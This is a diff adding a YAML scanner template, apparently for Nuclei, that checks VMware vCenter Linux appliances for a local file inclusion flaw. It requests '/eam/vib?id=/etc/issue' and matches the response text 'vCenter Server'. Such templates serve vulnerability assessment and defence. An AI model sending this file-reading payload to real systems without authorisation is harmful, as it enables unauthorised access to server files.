@@ -1,0 +1,14 @@
+id: vmware-vcenter-lfi-linux
+info:
+  author: PR3R00T
+  name: Vmware Vcenter LFI for Linux appliances
+  severity: high
+  tags: vmware,lfi
+requests:
+- matchers:
+  - type: word
+    words:
+    - vCenter Server
+  method: GET
+  path:
+  - '{{BaseURL}}/eam/vib?id=/etc/issue'
